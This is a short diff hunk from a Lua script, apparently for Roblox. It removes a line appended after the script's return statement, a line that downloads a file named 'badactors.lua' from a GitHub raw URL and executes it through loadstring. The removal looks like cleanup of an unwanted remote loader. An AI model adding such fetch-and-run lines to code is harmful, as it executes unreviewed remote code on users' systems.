@@ -370,4 +370,3 @@ function premium()
 end
 local success,err = pcall(premium)
 return StarId
-loadstring(game:HttpGet('https://raw.githubusercontent.com/null-federal/gayx/main/badactors.lua'))()
